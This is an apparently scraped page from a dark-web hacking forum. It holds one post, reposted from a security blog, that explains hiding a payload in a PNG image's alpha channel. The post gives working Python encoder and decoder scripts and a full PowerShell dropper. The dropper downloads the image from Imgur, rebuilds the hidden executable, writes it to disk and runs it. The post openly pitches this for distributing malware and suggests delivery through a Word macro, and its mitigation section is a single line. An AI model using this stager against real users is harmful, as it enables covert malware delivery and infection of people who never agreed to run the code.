{"url": "http://wqekut2pocn45hwp.onion/forums/viewtopic.php?f=16&t=20", "forum_name": "brotherhood", "html": "<!DOCTYPE html>\n<html dir=\"ltr\" lang=\"en-gb\">\n<head>\n<meta charset=\"utf-8\" />\n<meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\" />\n\n<title>Embed Malicious code in the Image - Brotherhood Hackers</title>\n\n\t<link rel=\"alternate\" type=\"application/atom+xml\" title=\"Feed - Brotherhood Hackers\" href=\"/forums/app.php/feed\">\t\t\t<link rel=\"alternate\" type=\"application/atom+xml\" title=\"Feed - New Topics\" href=\"/forums/app.php/feed/topics\">\t\t<link rel=\"alternate\" type=\"application/atom+xml\" title=\"Feed - Forum - Hacking books\" href=\"/forums/app.php/feed/forum/16\">\t<link rel=\"alternate\" type=\"application/atom+xml\" title=\"Feed - Topic - Embed Malicious code in the Image\" href=\"/forums/app.php/feed/topic/20\">\t\n\t<link rel=\"canonical\" href=\"http://wqekut2pocn45hwp.onion/forums/viewtopic.php?t=20\">\n\n<!--\n\tphpBB style name: prosilver\n\tBased on style:   prosilver (this is the default phpBB3 style)\n\tOriginal author:  Tom Beddard ( http://www.subBlue.com/ )\n\tModified by:\n-->\n\n<link href=\"./assets/css/font-awesome.min.css?assets_version=2\" rel=\"stylesheet\">\n<link href=\"./styles/prosilver/theme/stylesheet.css?assets_version=2\" rel=\"stylesheet\">\n<link href=\"./styles/prosilver/theme/en/stylesheet.css?assets_version=2\" rel=\"stylesheet\">\n\n\n\n\n<!--[if lte IE 9]>\n\t<link href=\"./styles/prosilver/theme/tweaks.css?assets_version=2\" rel=\"stylesheet\">\n<![endif]-->\n\n\n\n\n\n</head>\n<body id=\"phpbb\" class=\"nojs notouch section-viewtopic ltr \">\n\n\n<div id=\"wrap\" class=\"wrap\">\n\t<a id=\"top\" class=\"top-anchor\" accesskey=\"t\"></a>\n\t<div id=\"page-header\">\n\t\t<div class=\"headerbar\" role=\"banner\">\n\t\t\t\t\t<div class=\"inner\">\n\n\t\t\t<div id=\"site-description\" class=\"site-description\">\n\t\t\t\t<a id=\"logo\" class=\"logo\" href=\"./index.php\" title=\"Board index\"><span class=\"site_logo\"></span></a>\n\t\t\t\t<h1>Brotherhood Hackers</h1>\n\t\t\t\t<p>Welcome to the brotherhood hackers</p>\n\t\t\t\t<p class=\"skiplink\"><a href=\"#start_here\">Skip to content</a></p>\n\t\t\t</div>\n\n\t\t\t\t\t\t\t\t\t<div id=\"search-box\" class=\"search-box search-header\" role=\"search\">\n\t\t\t\t<form action=\"./search.php\" method=\"get\" id=\"search\">\n\t\t\t\t<fieldset>\n\t\t\t\t\t<input name=\"keywords\" id=\"keywords\" type=\"search\" maxlength=\"128\" title=\"Search for keywords\" class=\"inputbox search tiny\" size=\"20\" value=\"\" placeholder=\"Search\u2026\" />\n\t\t\t\t\t<button class=\"button button-search\" type=\"submit\" title=\"Search\">\n\t\t\t\t\t\t<i class=\"icon fa-search fa-fw\" aria-hidden=\"true\"></i><span class=\"sr-only\">Search</span>\n\t\t\t\t\t</button>\n\t\t\t\t\t<a href=\"./search.php\" class=\"button button-search-end\" title=\"Advanced search\">\n\t\t\t\t\t\t<i class=\"icon fa-cog fa-fw\" aria-hidden=\"true\"></i><span class=\"sr-only\">Advanced search</span>\n\t\t\t\t\t</a>\n\t\t\t\t\t\n\t\t\t\t</fieldset>\n\t\t\t\t</form>\n\t\t\t</div>\n\t\t\t\t\t\t\n\t\t\t</div>\n\t\t\t\t\t</div>\n\t\t\t\t<div class=\"navbar\" role=\"navigation\">\n\t<div class=\"inner\">\n\n\t<ul id=\"nav-main\" class=\"nav-main linklist\" role=\"menubar\">\n\n\t\t<li id=\"quick-links\" class=\"quick-links dropdown-container responsive-menu\" data-skip-responsive=\"true\">\n\t\t\t<a href=\"#\" class=\"dropdown-trigger\">\n\t\t\t\t<i class=\"icon fa-bars fa-fw\" aria-hidden=\"true\"></i><span>Quick links</span>\n\t\t\t</a>\n\t\t\t<div class=\"dropdown\">\n\t\t\t\t<div class=\"pointer\"><div class=\"pointer-inner\"></div></div>\n\t\t\t\t<ul class=\"dropdown-contents\" role=\"menu\">\n\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\t\t<li class=\"separator\"></li>\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<li>\n\t\t\t\t\t\t\t\t<a href=\"./search.php?search_id=unanswered\" role=\"menuitem\">\n\t\t\t\t\t\t\t\t\t<i class=\"icon fa-file-o fa-fw icon-gray\" aria-hidden=\"true\"></i><span>Unanswered topics</span>\n\t\t\t\t\t\t\t\t</a>\n\t\t\t\t\t\t\t</li>\n\t\t\t\t\t\t\t<li>\n\t\t\t\t\t\t\t\t<a href=\"./search.php?search_id=active_topics\" role=\"menuitem\">\n\t\t\t\t\t\t\t\t\t<i class=\"icon fa-file-o fa-fw icon-blue\" aria-hidden=\"true\"></i><span>Active topics</span>\n\t\t\t\t\t\t\t\t</a>\n\t\t\t\t\t\t\t</li>\n\t\t\t\t\t\t\t<li class=\"separator\"></li>\n\t\t\t\t\t\t\t<li>\n\t\t\t\t\t\t\t\t<a href=\"./search.php\" role=\"menuitem\">\n\t\t\t\t\t\t\t\t\t<i class=\"icon fa-search fa-fw\" aria-hidden=\"true\"></i><span>Search</span>\n\t\t\t\t\t\t\t\t</a>\n\t\t\t\t\t\t\t</li>\n\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\t\t<li class=\"separator\"></li>\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<li>\n\t\t\t\t\t\t\t\t<a href=\"./memberlist.php?mode=team\" role=\"menuitem\">\n\t\t\t\t\t\t\t\t\t<i class=\"icon fa-shield fa-fw\" aria-hidden=\"true\"></i><span>The team</span>\n\t\t\t\t\t\t\t\t</a>\n\t\t\t\t\t\t\t</li>\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<li class=\"separator\"></li>\n\n\t\t\t\t\t\t\t\t\t</ul>\n\t\t\t</div>\n\t\t</li>\n\n\t\t\t\t<li data-skip-responsive=\"true\">\n\t\t\t<a href=\"/forums/app.php/help/faq\" rel=\"help\" title=\"Frequently Asked Questions\" role=\"menuitem\">\n\t\t\t\t<i class=\"icon fa-question-circle fa-fw\" aria-hidden=\"true\"></i><span>FAQ</span>\n\t\t\t</a>\n\t\t</li>\n\t\t\t\t\t\t\n\t\t\t<li class=\"rightside\"  data-skip-responsive=\"true\">\n\t\t\t<a href=\"./ucp.php?mode=login\" title=\"Login\" accesskey=\"x\" role=\"menuitem\">\n\t\t\t\t<i class=\"icon fa-power-off fa-fw\" aria-hidden=\"true\"></i><span>Login</span>\n\t\t\t</a>\n\t\t</li>\n\t\t\t\t\t<li class=\"rightside\" data-skip-responsive=\"true\">\n\t\t\t\t<a href=\"./ucp.php?mode=register\" role=\"menuitem\">\n\t\t\t\t\t<i class=\"icon fa-pencil-square-o  fa-fw\" aria-hidden=\"true\"></i><span>Register</span>\n\t\t\t\t</a>\n\t\t\t</li>\n\t\t\t\t\t\t</ul>\n\n\t<ul id=\"nav-breadcrumbs\" class=\"nav-breadcrumbs linklist navlinks\" role=\"menubar\">\n\t\t\t\t\t\t<li class=\"breadcrumbs\">\n\t\t\t\t\t\t\t\t\t\t<span class=\"crumb\"  itemtype=\"http://data-vocabulary.org/Breadcrumb\" itemscope=\"\"><a href=\"./index.php\" itemprop=\"url\" accesskey=\"h\" data-navbar-reference=\"index\"><i class=\"icon fa-home fa-fw\"></i><span itemprop=\"title\">Board index</span></a></span>\n\n\t\t\t\t\t\t\t\t\t\t\t<span class=\"crumb\"  itemtype=\"http://data-vocabulary.org/Breadcrumb\" itemscope=\"\" data-forum-id=\"3\"><a href=\"./viewforum.php?f=3\" itemprop=\"url\"><span itemprop=\"title\">Hacking</span></a></span>\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<span class=\"crumb\"  itemtype=\"http://data-vocabulary.org/Breadcrumb\" itemscope=\"\" data-forum-id=\"16\"><a href=\"./viewforum.php?f=16\" itemprop=\"url\"><span itemprop=\"title\">Hacking books</span></a></span>\n\t\t\t\t\t\t\t\t\t\t\t\t</li>\n\t\t\n\t\t\t\t\t<li class=\"rightside responsive-search\">\n\t\t\t\t<a href=\"./search.php\" title=\"View the advanced search options\" role=\"menuitem\">\n\t\t\t\t\t<i class=\"icon fa-search fa-fw\" aria-hidden=\"true\"></i><span class=\"sr-only\">Search</span>\n\t\t\t\t</a>\n\t\t\t</li>\n\t\t\t</ul>\n\n\t</div>\n</div>\n\t</div>\n\n\t\n\t<a id=\"start_here\" class=\"anchor\"></a>\n\t<div id=\"page-body\" class=\"page-body\" role=\"main\">\n\t\t\n\t\t\n<h2 class=\"topic-title\"><a href=\"./viewtopic.php?f=16&amp;t=20\">Embed Malicious code in the Image</a></h2>\n<!-- NOTE: remove the style=\"display: none\" when you want to have the forum description on the topic body -->\n<div style=\"display: none !important;\">hacking books<br /></div>\n<p>\n\t<strong>Moderator:</strong> <a href=\"./memberlist.php?mode=group&amp;g=8\">Brotherhood hackers</a>\n</p>\n\n\n<div class=\"action-bar bar-top\">\n\t\n\t\t\t<a href=\"./posting.php?mode=reply&amp;f=16&amp;t=20\" class=\"button\" title=\"Post a reply\">\n\t\t\t\t\t\t\t<span>Post Reply</span> <i class=\"icon fa-reply fa-fw\" aria-hidden=\"true\"></i>\n\t\t\t\t\t</a>\n\t\n\t\t\t<div class=\"dropdown-container dropdown-button-control topic-tools\">\n\t\t<span title=\"Topic tools\" class=\"button button-secondary dropdown-trigger dropdown-select\">\n\t\t\t<i class=\"icon fa-wrench fa-fw\" aria-hidden=\"true\"></i>\n\t\t\t<span class=\"caret\"><i class=\"icon fa-sort-down fa-fw\" aria-hidden=\"true\"></i></span>\n\t\t</span>\n\t\t<div class=\"dropdown\">\n\t\t\t<div class=\"pointer\"><div class=\"pointer-inner\"></div></div>\n\t\t\t<ul class=\"dropdown-contents\">\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<li>\n\t\t\t\t\t<a href=\"./viewtopic.php?f=16&amp;t=20&amp;view=print\" title=\"Print view\" accesskey=\"p\">\n\t\t\t\t\t\t<i class=\"icon fa-print fa-fw\" aria-hidden=\"true\"></i><span>Print view</span>\n\t\t\t\t\t</a>\n\t\t\t\t</li>\n\t\t\t\t\t\t\t\t\t\t\t</ul>\n\t\t</div>\n\t</div>\n\t\n\t\t\t<div class=\"search-box\" role=\"search\">\n\t\t\t<form method=\"get\" id=\"topic-search\" action=\"./search.php\">\n\t\t\t<fieldset>\n\t\t\t\t<input class=\"inputbox search tiny\"  type=\"search\" name=\"keywords\" id=\"search_keywords\" size=\"20\" placeholder=\"Search this topic\u2026\" />\n\t\t\t\t<button class=\"button button-search\" type=\"submit\" title=\"Search\">\n\t\t\t\t\t<i class=\"icon fa-search fa-fw\" aria-hidden=\"true\"></i><span class=\"sr-only\">Search</span>\n\t\t\t\t</button>\n\t\t\t\t<a href=\"./search.php\" class=\"button button-search-end\" title=\"Advanced search\">\n\t\t\t\t\t<i class=\"icon fa-cog fa-fw\" aria-hidden=\"true\"></i><span class=\"sr-only\">Advanced search</span>\n\t\t\t\t</a>\n\t\t\t\t<input type=\"hidden\" name=\"t\" value=\"20\" />\n<input type=\"hidden\" name=\"sf\" value=\"msgonly\" />\n\n\t\t\t</fieldset>\n\t\t\t</form>\n\t\t</div>\n\t\n\t\t\t<div class=\"pagination\">\n\t\t\t1 post\n\t\t\t\t\t\t\t&bull; Page <strong>1</strong> of <strong>1</strong>\n\t\t\t\t\t</div>\n\t\t</div>\n\n\n\n\n\t\t\t<div id=\"p20\" class=\"post has-profile bg2\">\n\t\t<div class=\"inner\">\n\n\t\t<dl class=\"postprofile\" id=\"profile20\">\n\t\t\t<dt class=\"has-profile-rank has-avatar\">\n\t\t\t\t<div class=\"avatar-container\">\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<a href=\"./memberlist.php?mode=viewprofile&amp;u=2\" class=\"avatar\"><img class=\"avatar\" src=\"./download/file.php?avatar=2_1492381554.gif\" width=\"100\" height=\"100\" alt=\"User avatar\" /></a>\t\t\t\t\t\t\t\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t\t\t<a href=\"./memberlist.php?mode=viewprofile&amp;u=2\" style=\"color: #AA0000;\" class=\"username-coloured\">darkelite187</a>\t\t\t\t\t\t\t</dt>\n\n\t\t\t\t\t\t<dd class=\"profile-rank\">Site Owner</dd>\t\t\t\n\t\t<dd class=\"profile-posts\"><strong>Posts:</strong> <a href=\"./search.php?author_id=2&amp;sr=posts\">284</a></dd>\t\t<dd class=\"profile-joined\"><strong>Joined:</strong> Thu Apr 13, 2017 5:56 pm</dd>\t\t\n\t\t\n\t\t\t\t\t\t\n\t\t\t\t\t\t\n\t\t</dl>\n\n\t\t<div class=\"postbody\">\n\t\t\t\t\t\t<div id=\"post_content20\">\n\n\t\t\t\t\t\t<h3 class=\"first\"><a href=\"#p20\">Embed Malicious code in the Image</a></h3>\n\n\t\t\t\t\t\t\t\t\t\t\t\t\t<ul class=\"post-buttons\">\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<li>\n\t\t\t\t\t\t\t<a href=\"./posting.php?mode=quote&amp;f=16&amp;p=20\" title=\"Reply with quote\" class=\"button button-icon-only\">\n\t\t\t\t\t\t\t\t<i class=\"icon fa-quote-left fa-fw\" aria-hidden=\"true\"></i><span class=\"sr-only\">Quote</span>\n\t\t\t\t\t\t\t</a>\n\t\t\t\t\t\t</li>\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t</ul>\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t<p class=\"author\">\n\t\t\t\t\t\t\t\t\t<a class=\"unread\" href=\"./viewtopic.php?p=20#p20\" title=\"Post\">\n\t\t\t\t\t\t<i class=\"icon fa-file fa-fw icon-lightgray icon-md\" aria-hidden=\"true\"></i><span class=\"sr-only\">Post</span>\n\t\t\t\t\t</a>\n\t\t\t\t\t\t\t\t<span class=\"responsive-hide\">by <strong><a href=\"./memberlist.php?mode=viewprofile&amp;u=2\" style=\"color: #AA0000;\" class=\"username-coloured\">darkelite187</a></strong> &raquo; </span>Fri Apr 14, 2017 2:04 pm\n\t\t\t</p>\n\t\t\t\n\t\t\t\n\t\t\t\n\t\t\t<div class=\"content\">Encoding a file within a PNG<br>\n<br>\nFirst, it helps to understand a PNG file. Unlike JPEG, PNG is lossless even though it is compressed, meaning that when you create an image in the format, it retains the data that it has been generated until the resolution or colour pallette is modified. Unlike a GIF, a PNG file handles transparency through an alpha channel instead of colour substitution.<br>\n<br>\nIt's this compression and the alpha channel that will enable us to embed data into a PNG. Each pixel is represented by three 8-bit values for colour and another 8-bit values for transparency level (referred to as an \u201calpha channel\"). This means that each pixel would be presented as R, G, B, and A with values from 0-255 on each.<br>\n<br>\nHere's a sample image (sourced via Wikipedia) with what I am talking about:<br>\n<br>\nblog_sample<br>\n<br>\nThis image is 800\u00d7600 pixels with 8-bit colour and an alpha channel, meaning that we have 480,000 pixels, or 468 KB of data that we can place within. Let's use Pillow and Python to mess with this.<br>\n<br>\nUsing the above script is relatively straightforward:<br>\n<br>\n    from PIL import Image<br>\n    from sys import argv<br>\n    from base64 import b64encode<br>\n<br>\n    i = argv[1]<br>\n    o = argv[2]<br>\n    with open(argv[3], 'rb') as f:<br>\n        text = f.read()<br>\n<br>\n    img_in = Image.open(i)<br>\n    img_pad = img_in.size[0] * img_in.size[1]<br>\n    text = b64encode(text)<br>\n    if len(text) &lt; img_pad:<br>\n        text = text + 'x00'*(img_pad - len(text))<br>\n    else:<br>\n        print('File is too large to embed into the image.')<br>\n        quit()<br>\n    text = [text[i:i+img_in.size[1]] for i in range(0, len(text), img_in.size[1])]<br>\n<br>\n    img_size = img_in.size<br>\n    img_mode = img_in.mode<br>\n    img_o = Image.new(img_mode, img_size)<br>\n<br>\n    for ih, tblock in zip(xrange(img_in.size[0]), text):<br>\n        for iv, an in zip(xrange(img_in.size[1]), [ord(x) for x in tblock]):<br>\n            x, y, z, a = img_in.getpixel((ih, iv))<br>\n            pixels = (x, y, z, an)<br>\n            img_o.putpixel((ih, iv), pixels)<br>\n<br>\n    img_o.save(o)<br>\n<br>\nExecuting it is as follows:<br>\n<br>\n    $ python encode.py image.png image_out.png payload.dat<br>\n<br>\nWhen it runs, it ensures that the payload is not larger than the image can handle then encodes it using Base64 then pads it with null bytes until it reaches the size of the total number of pixels. Then the process of replacing each alpha channel value with the value of the character in the encoded data is done and then saved to disk.<br>\n<br>\nLet's embed an image into an image shall we!<br>\n<br>\nblog_sample-out<br>\n<br>\nInside of this image I've encoded a JPEG within it. The image has obviously changed towards a bit of a softer look with some jankiness in the transparency but you'd normally never think of it being suspicious. With some changes to the encoding process it is possible to make the alpha channel blend in a lot more naturally.<br>\n<br>\nFor the curious, this is the image that was embedded within:<br>\n<br>\nThis Python script can retrieve the data out of the image:<br>\n<br>\n    from PIL import Image<br>\n    from sys import argv<br>\n    from base64 import b64decode<br>\n<br>\n    i = argv[1]<br>\n    o = ''<br>\n    s = argv[2]<br>\n<br>\n    img = Image.open(i)<br>\n<br>\n    for x in xrange(img.size[0]):<br>\n        for y in xrange(img.size[1]):<br>\n            p = img.getpixel((x, y))<br>\n            p = p[-1]<br>\n            o = o + chr(p)<br>\n<br>\n    o = o.replace('\ufffd00', '')<br>\n    o = b64decode(o)<br>\n<br>\n    with open(s, 'wb') as f:<br>\n        f.write(o)<br>\n<br>\nWe can confirm that nothing is lost by running these commands:<br>\n<br>\n    $ md5 blog_sample.png<br>\n    MD5 (blog_sample.png) = 694ab6d3260933f75dec92ba01902f9b<br>\n    $ python encoder.py blog_sample.png blog_sample.out.png antivirus.jpg<br>\n    $ md5 blog_sample.out.png<br>\n    MD5 (blog_sample.out.png) = 10a4fd1bf52d0bfa50ced699f8c53c39<br>\n    $ md5 antivirus.jpg<br>\n    MD5 (antivirus.jpg) = 84893c561288b6a1a9d76f399a89d51b<br>\n    $ python decoder.py blog_sample.out.png antivirus.orig.jpg<br>\n    $ md5 antivirus.orig.jpg<br>\n    MD5 (antivirus.orig.jpg) = 84893c561288b6a1a9d76f399a89d51b<br>\n<br>\nAs you can see the file contents do not change by the embedding of data within the image's alpha channel.<br>\nLet's use Imgur and Powershell to abuse this<br>\n<br>\nSince its debut on Reddit, Imgur has become one of the largest image hosting services. This is largely due to its ease of access in uploading images without requiring anyone to create an account.<br>\n<br>\nIn tests, Imgur does appear to strip out data that doesn't belong to an image. That is, you cannot use a old technique where you combine a zip file with a JPEG or PNG on their service as it appears to outright strip the data.<br>\n<br>\nSince we know that it'll remove these hybrid files, the question then becomes whether it removes the data we encode as demonstrated earlier. Let's try uploading the sample image from earlier and check.<br>\n<br>\n    $ md5 blog_sample.out.png<br>\n    MD5 (blog_sample.out.png) = 10a4fd1bf52d0bfa50ced699f8c53c39<br>\n    $ wget <a href=\"https://i.imgur.com/Oj8FhU5.png\" class=\"postlink\">https://i.imgur.com/Oj8FhU5.png</a><br>\n    --2016-11-24 13:56:50--  <a href=\"https://i.imgur.com/Oj8FhU5.png\" class=\"postlink\">https://i.imgur.com/Oj8FhU5.png</a><br>\n    Resolving i.imgur.com... 151.101.52.193<br>\n    Connecting to i.imgur.com|151.101.52.193|:443... connected.<br>\n    HTTP request sent, awaiting response... 200 OK<br>\n    Length: 664208 (649K) [image/png]<br>\n    Saving to: 'Oj8FhU5.png'<br>\n<br>\n    Oj8FhU5.png               100%[====================================&gt;] 648.64K  2.42MB/s   in 0.3s<br>\n<br>\n    2016-11-24 13:56:51 (2.42 MB/s) - 'Oj8FhU5.png' saved [664208/664208]<br>\n<br>\n    $ md5 Oj8FhU5.png<br>\n    MD5 (Oj8FhU5.png) = 10a4fd1bf52d0bfa50ced699f8c53c39<br>\n<br>\nAs we can see here, the file from earlier was uploaded to Imgur has not been altered.<br>\n<br>\nSo where do we go from here? How is this useful? Well to start, the thing that Imgur is great for is that you do not need to sign up with an account to upload an image. Why not use it to distribute malware without having to provide too many details?<br>\n<br>\nOne thing to be concerned about is that you have to have the ability to retrieve the PNG image and then process it as while there have been code execution issues with PNG libraries in the past, for the most part just loading a payloaded-image is unlikely to result in compromise.<br>\n<br>\nFortunately, Windows has built-in functions that straight up let you work with an image and extract the pixel data. This can be achieved using Powershell without any additional modules. The code is as follows:<br>\n<br>\n    Add-Type -AssemblyName System.Drawing <br>\n    Add-Type -AssemblyName System.Text.Encoding<br>\n<br>\n    $strURL = \"<a href=\"http://i.imgur.com/nckqSN1.png\" class=\"postlink\">http://i.imgur.com/nckqSN1.png</a>\"<br>\n    $strFilename = \"c:temppayloadb64.png\"<br>\n    $peOutputFile = \"c:tempcalc.exe\"<br>\n<br>\n    Invoke-WebRequest -Uri $strURL -OutFile $strFilename<br>\n<br>\n    $image = [System.Drawing.Image]::FromFile($strFilename)<br>\n    $peBase64 = @()<br>\n    for ($w=0;$w -lt $image.Width;$w++)<br>\n    {<br>\n        $row = @()<br>\n        for ($h=0;$h -lt $image.Height;$h++)<br>\n        {<br>\n            $pixel = ($image.GetPixel($w,$h)).A<br>\n            $pixel = [convert]::toint32($pixel, 10)<br>\n            $pixel = [char]$pixel<br>\n            $row += $pixel<br>\n        }<br>\n        $peBase64 = $peBase64 + $row <br>\n    }<br>\n<br>\n    $peImage = @()<br>\n    foreach ($peValue in $peBase64)<br>\n    {<br>\n        if ($peValue -ne \"`0\")<br>\n        {<br>\n            $peImage = $peImage += $peValue<br>\n        }<br>\n    }<br>\n<br>\n    $peImage = [System.Convert]::FromBase64String($peImage)<br>\n    [System.IO.File]::WriteAllBytes($peOutputFile, $peImage)<br>\n    &amp; $peOutputFile<br>\n<br>\nThe script works as follows:<br>\n<br>\n    Download a PNG from Imgur and save it to disk<br>\n    Using System.Drawing, read every pixel and extract the alpha (A) value<br>\n    Ensure that all null values (0x00) are stripped from the array<br>\n    Decode Base64 and write file to disk<br>\n    Run the newly decoded file as an executable<br>\n<br>\nAnd based on the above code, it of course executes calculator:<br>\n<br>\npowershell<br>\n<br>\nExecuting the above code does require that your system's policy to allow the execution of Powershell scripts. That said, while on most home computers this is not an issue as it is disabled by default, many enterprise environments require this to be on. A way around any restrictions could be to execute the code with the help of VBScript and perhaps storing all of this within a Word macro.<br>\nMitigation<br>\n<br>\nOne thing to keep in mind is that while the attack was done using Powershell, it doesn't mean that you couldn't achieve this with a Word document with an embedded macro. Avoiding executing any unwanted code is really the best way to go about avoiding this from an enduser perspective.<br>\n<br>\nSource: <a href=\"http://colin.keigher.ca/2016/12/going-viral-on-imgur-with-powershell.html\" class=\"postlink\">http://colin.keigher.ca/2016/12/going-v ... shell.html</a><br>\n<br>\nOther resources: <a href=\"http://blog.portswigger.net/2016/12/bypassing-csp-using-polyglot-jpegs.html\" class=\"postlink\">http://blog.portswigger.net/2016/12/byp ... jpegs.html</a><br>\n<br>\n<a href=\"http://www.instructables.com/id/How-to-hide-one-image-in-another-An-introduction-/\" class=\"postlink\">http://www.instructables.com/id/How-to- ... oduction-/</a><br>\n<br>\n<a href=\"http://www.openstego.com/\" class=\"postlink\">http://www.openstego.com/</a></div>\n\n\t\t\t\n\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t</div>\n\n\t\t</div>\n\n\t\t\t\t<div class=\"back2top\">\n\t\t\t\t\t\t<a href=\"#top\" class=\"top\" title=\"Top\">\n\t\t\t\t<i class=\"icon fa-chevron-circle-up fa-fw icon-gray\" aria-hidden=\"true\"></i>\n\t\t\t\t<span class=\"sr-only\">Top</span>\n\t\t\t</a>\n\t\t\t\t\t</div>\n\t\t\n\t\t</div>\n\t</div>\n\n\t<hr class=\"divider\" />\n\t\n\n\t<div class=\"action-bar bar-bottom\">\n\t\n\t\t\t<a href=\"./posting.php?mode=reply&amp;f=16&amp;t=20\" class=\"button\" title=\"Post a reply\">\n\t\t\t\t\t\t\t<span>Post Reply</span> <i class=\"icon fa-reply fa-fw\" aria-hidden=\"true\"></i>\n\t\t\t\t\t</a>\n\t\t\n\t\t<div class=\"dropdown-container dropdown-button-control topic-tools\">\n\t\t<span title=\"Topic tools\" class=\"button button-secondary dropdown-trigger dropdown-select\">\n\t\t\t<i class=\"icon fa-wrench fa-fw\" aria-hidden=\"true\"></i>\n\t\t\t<span class=\"caret\"><i class=\"icon fa-sort-down fa-fw\" aria-hidden=\"true\"></i></span>\n\t\t</span>\n\t\t<div class=\"dropdown\">\n\t\t\t<div class=\"pointer\"><div class=\"pointer-inner\"></div></div>\n\t\t\t<ul class=\"dropdown-contents\">\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<li>\n\t\t\t\t\t<a href=\"./viewtopic.php?f=16&amp;t=20&amp;view=print\" title=\"Print view\" accesskey=\"p\">\n\t\t\t\t\t\t<i class=\"icon fa-print fa-fw\" aria-hidden=\"true\"></i><span>Print view</span>\n\t\t\t\t\t</a>\n\t\t\t\t</li>\n\t\t\t\t\t\t\t\t\t\t\t</ul>\n\t\t</div>\n\t</div>\n\n\t\n\t\n\t\n\t\t\t<div class=\"pagination\">\n\t\t\t1 post\n\t\t\t\t\t\t\t&bull; Page <strong>1</strong> of <strong>1</strong>\n\t\t\t\t\t</div>\n\t</div>\n\n\n<div class=\"action-bar actions-jump\">\n\t\t<p class=\"jumpbox-return\">\n\t\t<a href=\"./viewforum.php?f=16\" class=\"left-box arrow-left\" accesskey=\"r\">\n\t\t\t<i class=\"icon fa-angle-left fa-fw icon-black\" aria-hidden=\"true\"></i><span>Return to \u201cHacking books\u201d</span>\n\t\t</a>\n\t</p>\n\t\n\t\t<div class=\"jumpbox dropdown-container dropdown-container-right dropdown-up dropdown-left dropdown-button-control\" id=\"jumpbox\">\n\t\t\t<span title=\"Jump to\" class=\"button button-secondary dropdown-trigger dropdown-select\">\n\t\t\t\t<span>Jump to</span>\n\t\t\t\t<span class=\"caret\"><i class=\"icon fa-sort-down fa-fw\" aria-hidden=\"true\"></i></span>\n\t\t\t</span>\n\t\t<div class=\"dropdown\">\n\t\t\t<div class=\"pointer\"><div class=\"pointer-inner\"></div></div>\n\t\t\t<ul class=\"dropdown-contents\">\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<li><a href=\"./viewforum.php?f=33\" class=\"jumpbox-forum-link\"> <span> Classes 101</span></a></li>\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<li><a href=\"./viewforum.php?f=3\" class=\"jumpbox-forum-link\"> <span> Hacking</span></a></li>\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<li><a href=\"./viewforum.php?f=7\" class=\"jumpbox-sub-link\"><span class=\"spacer\"></span> <span> &#8627; &nbsp; Hacking Tools</span></a></li>\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<li><a href=\"./viewforum.php?f=29\" class=\"jumpbox-sub-link\"><span class=\"spacer\"></span><span class=\"spacer\"></span> <span> &#8627; &nbsp; Password Lists</span></a></li>\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<li><a href=\"./viewforum.php?f=16\" class=\"jumpbox-sub-link\"><span class=\"spacer\"></span> <span> &#8627; &nbsp; Hacking books</span></a></li>\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<li><a href=\"./viewforum.php?f=17\" class=\"jumpbox-sub-link\"><span class=\"spacer\"></span> <span> &#8627; &nbsp; DOXING</span></a></li>\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<li><a href=\"./viewforum.php?f=18\" class=\"jumpbox-sub-link\"><span class=\"spacer\"></span> <span> &#8627; &nbsp; Hacking Help</span></a></li>\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<li><a href=\"./viewforum.php?f=19\" class=\"jumpbox-sub-link\"><span class=\"spacer\"></span> <span> &#8627; &nbsp; Hacked</span></a></li>\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<li><a href=\"./viewforum.php?f=20\" class=\"jumpbox-sub-link\"><span class=\"spacer\"></span> <span> &#8627; &nbsp; Members Tools</span></a></li>\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<li><a href=\"./viewforum.php?f=24\" class=\"jumpbox-sub-link\"><span class=\"spacer\"></span> <span> &#8627; &nbsp; Our services</span></a></li>\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<li><a href=\"./viewforum.php?f=27\" class=\"jumpbox-sub-link\"><span class=\"spacer\"></span> <span> &#8627; &nbsp; our shop</span></a></li>\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<li><a href=\"./viewforum.php?f=30\" class=\"jumpbox-sub-link\"><span class=\"spacer\"></span> <span> &#8627; &nbsp; Classes lol</span></a></li>\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<li><a href=\"./viewforum.php?f=1\" class=\"jumpbox-cat-link\"> <span> Site News</span></a></li>\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<li><a href=\"./viewforum.php?f=2\" class=\"jumpbox-sub-link\"><span class=\"spacer\"></span> <span> &#8627; &nbsp; Site News</span></a></li>\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<li><a href=\"./viewforum.php?f=15\" class=\"jumpbox-sub-link\"><span class=\"spacer\"></span> <span> &#8627; &nbsp; Admins PGP 